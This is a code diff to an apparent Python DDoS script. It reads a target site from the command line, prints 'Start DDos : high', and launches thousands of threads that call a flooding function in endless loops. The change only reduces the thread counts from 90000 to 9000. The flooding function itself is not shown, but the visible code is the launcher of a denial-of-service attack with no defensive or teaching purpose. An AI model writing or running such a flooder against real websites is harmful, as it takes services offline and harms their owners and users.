@@ -4,9 +4,9 @@ import sys,random
 import time
 import os
 site = sys.argv[1]
-t = [None] *90000
-a = [None] *90000
-l = [None] *90000
+t = [None] *9000
+a = [None] *9000
+l = [None] *9000
 
 print('TARGET SaVe : '+site)
 print('Start DDos : high')
@@ -40,10 +40,10 @@ def dos2():
 	while 1:
 		dos()
 
-for i in range(90000):
+for i in range(9000):
 	t[i] = threading.Thread(target=dos)
-for h in range(90000):
+for h in range(9000):
 	l[h] = threading.Thread(target=dos2)
-for k in range(90000):
+for k in range(9000):
 	t[k].start()
 	l[k].start()
